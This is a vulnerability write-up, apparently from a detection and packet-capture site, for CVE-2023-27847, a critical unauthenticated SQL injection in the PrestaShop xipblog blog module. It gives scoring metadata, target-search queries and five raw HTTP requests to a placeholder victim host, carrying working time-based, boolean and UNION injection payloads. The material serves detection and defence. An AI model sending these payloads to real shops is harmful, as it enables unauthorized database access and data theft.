---
layout: post
cve_id: CVE-2023-27847
title: PrestaShop xipblog - SQL Injection
pcap: true
pcap_path: /pcaps/2023/CVE-2023-27847.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-27847.yaml
snort2_rule: N/A
snort3_rule: N/A
author: mastercho
severity: critical
remediation: 'Apply the latest security patches and updates from the vendor to address
  this vulnerability.

  '
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary SQL queries, potentially leading to unauthorized access and data
  leakage.

  '
reference:
- https://security.friendsofpresta.org/modules/2023/03/23/xipblog.html
- https://nvd.nist.gov/vuln/detail/CVE-2023-27847
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-27847
  cwe-id: CWE-89
  epss-score: 0.68607
  epss-percentile: 0.98559
metadata:
  verified: true
  max-request: 5
  framework: prestashop
  shodan-query: html:"/xipblog"
  fofa-query: app="Prestashop"
tags:
- time-based-sqli
- cve
- cve2023
- prestashop
- sqli
- xipblog
- vuln
---

## üîç Vulnerability Description
In the blog module (xipblog), an anonymous user can perform SQL injection. Even though the module has been patched in version 2.0.1, the version number was not incremented at the time.


## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/ Firefox/3.6.17
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /module/xipblog/archive?id=1&page_type=category&rewrite=news&subpage_type=post"+AND+(SELECT+5728+FROM+(SELECT(SLEEP(5)))AuDU)--+lafl HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3) AppleWebKit/614.31.14 (KHTML, like Gecko) Version/17.0.96 Safari/614.31.14
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /module/xipblog/archive?id=1&page_type=category&rewrite=news&subpage_type=post"+AND+5484=5484--+xhCs HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /module/xipblog/archive?id=1&page_type=category&rewrite=news&subpage_type=post"+AND+5484=5485--+xhCs HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /module/xipblog/archive?id=1&page_type=category&rewrite=news&subpage_type=post"+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5(3692)),NULL,NULL--+- HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20
Connection: close
Accept-Encoding: gzip
```

